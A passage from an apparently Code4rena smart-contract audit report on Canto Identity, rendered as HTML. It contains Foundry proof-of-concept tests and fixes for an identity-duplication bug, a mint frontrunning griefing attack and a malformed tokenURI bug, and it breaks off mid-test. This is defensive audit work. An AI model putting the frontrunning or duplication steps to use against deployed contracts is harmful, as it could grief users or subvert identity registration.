class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 3 - Alice transfers the CID NFT to Bob</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nftIdOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 4 - Bob registers the nft</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">addressRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">register</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nftIdOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 5 - Alice and Bob have the same identity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cidAlice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">addressRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCID</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cidBob</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">addressRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCID</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">cidAlice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cidBob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual Analysis, Foundry</p>\n<h3 id=\"mitigation\" style=\"position:relative;\"><a href=\"#mitigation\" aria-label=\"mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p><code>AddressRegistry</code> should have an additional mapping to track the account associated with a given <code>cifNTFID</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: src/AddressRegistry.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">20:     /// @notice Stores the mappings of users to their CID NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">21:     mapping(address =&gt; uint256) private cidNFTs;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       mapping(uint256 =&gt; address) private accounts;</span></span></span></code></pre>\n<p>When registering, the code would check if the <code>cidNFTID</code> has an account associated with it.\nIf that is the case, <code>cidNFTs</code> for this user would be set to 0, preventing several users from having the same identity.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: src/AddressRegistry.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">42: function register(uint256 _cidNFTID) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">43:         if (ERC721(cidNFT).ownerOf(_cidNFTID) != msg.sender)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">44:             // We only guarantee that a CID NFT is owned by the user at the time of registration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">45:             // ownerOf reverts if non-existing ID is provided</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">46:             revert NFTNotOwnedByUser(_cidNFTID, msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           if (accounts[_cidNFTID] != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                 delete cidNFTs[accounts[_cidNFTID]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                 emit CIDNFTRemoved(accounts[_cidNFTID], _cidNFTID);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">47:         cidNFTs[msg.sender] = _cidNFTID;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           accounts[_cidNFTID] = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">48:         emit CIDNFTAdded(msg.sender, _cidNFTID);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">49:     }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/177#issuecomment-1431920998\">OpenCoreCH (Canto Identity) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>I first thought that this is intended behaviour because the same identity/person can have multiple wallets. But after seeing the examples in the findings and discussing this internally, it will be changed such that registrations are removed on transfer.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-griefing-risk-in-mint\" style=\"position:relative;\"><a href=\"#m-03-griefing-risk-in-mint\" aria-label=\"m 03 griefing risk in mint permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115\">[M-03] Griefing risk in <code>mint</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115\">shenwilly</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/58\">gzeon</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L147-L157\">CidNFT.sol#L147-L157</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L177-L182\">CidNFT.sol#L177-L182</a></p>\n<p><code>CidNFT.mint()</code> has an optional parameter <code>_addList</code> that enables users to register subprotocol NFTs to the CID NFT right after the mint.</p>\n<p>However, there is no guarantee that the <code>_cidNFTID</code>  encoded in <code>_addList</code> is the same ID as the newly minted NFT. If there is a pending mint transaction and another user frontrun the mint transaction with higher fee, the previous transaction will revert as the <code>_cidNFTID</code> is no longer the expected ID.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L177-L182\">CidNFT.sol#L177-L182</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cidNFTOwner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ownerOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">cidNFTOwner</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">getApproved</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    !</span><span class=\"mtk12\">isApprovedForAll</span><span class=\"mtk1\">[</span><span class=\"mtk12\">cidNFTOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotAuthorizedForCIDNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cidNFTOwner</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>A malicious actor can grief this by frontrunning users that try to mint with non-zero <code>_addList</code>, causing their mint transaction to fail.</p>\n<p>In absence of malicious actor, it is also possible for this issue to happen randomly during busy period where a lot of users are trying to mint at the same time.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>The next CidNFT mint ID is <code>1000</code>.</li>\n<li>Alice wants to mint and prepares <code>_addList</code> with the expected <code>_cidNFTID</code> of <code>1000</code>.</li>\n<li>Bob saw Alice’s transaction and frontran her, incrementing the next minting ID to <code>1001</code>.</li>\n<li>Alice’s transaction tries to add subprotocol NFTs to ID <code>1000</code> which is owned by Bob. This causes the transaction to revert.</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Modify <code>mint</code> so that the minted ID is the one used during the <code>add</code> loop, ensuring that <code>mint</code> will always succeed.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115#issuecomment-1435289830\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Although this submission and <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67\">H-01</a> both share a common root cause of frontrunning mints and colliding CidNFT ids in the <code>CidNFT.add</code> function, it is essential to note that the impact of each issue is significantly different and therefore warrant to be kept separate. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115#issuecomment-1499329752\">OpenCoreCH (Canto Identity) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-04-cidnft-broken-tokenuri-function\" style=\"position:relative;\"><a href=\"#m-04-cidnft-broken-tokenuri-function\" aria-label=\"m 04 cidnft broken tokenuri function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89\">[M-04] <code>CidNFT</code>: Broken <code>tokenURI</code> function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89\">horsefacts</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L133-L142\"><code>CidNFT#tokenURI</code></a> does not convert the <code>uint256 _id</code> argument to a string before interpolating it in the token URI:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Get the token URI for the provided ID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _id ID to retrieve the URI for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @return tokenURI The URI of the queried token (path to a JSON file)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ownerOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// According to ERC721, this revert for non-existing tokens is required</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TokenNotMinted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">string</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseURI</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.json&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This means the raw bytes of the 32-byte ABI encoded integer <code>_id</code> will be interpolated into the token URI, e.g. <code>0x0000000000000000000000000000000000000000000000000000000000000001</code> for ID <code>#1</code>.</p>\n<p>Most of the resulting UTF-8 strings will be malformed, incorrect, or invalid URIs. For example, token ID <code>#1</code> will show up as the invisible “start of heading” control character, and ID <code>#42</code> will show as the asterisk symbol <code>*</code>. URI-unsafe characters will break the token URIs altogether.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<ul>\n<li><code>CidNFT</code> tokens will have invalid <code>tokenURI</code>s. Offchain tools that read the <code>tokenURI</code> view may break or display malformed data.</li>\n</ul>\n<h3 id=\"suggestion\" style=\"position:relative;\"><a href=\"#suggestion\" aria-label=\"suggestion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Suggestion</h3>\n<p>Convert the <code>_id</code> to a string before calling <code>abi.encodePacked</code>. Latest Solmate includes a <code>LibString</code> helper library for this purpose:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;solmate/utils/LibString.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Get the token URI for the provided ID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _id ID to retrieve the URI for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @return tokenURI The URI of the queried token (path to a JSON file)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ownerOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// According to ERC721, this revert for non-existing tokens is required</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TokenNotMinted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">string</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseURI</span><span class=\"mtk1\">, </span><span class=\"mtk12\">LibString</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;.json&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"test-case\" style=\"position:relative;\"><a href=\"#test-case\" aria-label=\"test case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test case</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_InvalidTokenURI</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">numMinted</span><span class=\"mtk1\">() + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">numMinted</span><span class=\"mtk1\">() + </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// mint id1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// mint id2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span 